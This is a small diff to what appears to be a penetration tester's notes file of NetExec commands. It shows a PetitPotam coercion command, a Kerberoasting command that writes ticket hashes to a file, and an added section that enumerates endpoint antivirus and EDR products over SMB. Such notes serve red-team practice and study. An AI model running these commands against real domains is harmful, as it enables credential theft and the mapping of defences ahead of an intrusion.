@@ -37,3 +37,7 @@ nxc smb $IP -M coerce_plus -o METHOD=PetitPotam
 ```
 nxc ldap $DCIP -u $USER -p $USERPASS --kerberoasting kerberos_out.txt
 ```
+# Checking [[Endpoint Detection and Response|EDR]]
+```
+nxc smb $IP -u $USER -p $USERPASS -M enum_av
+```
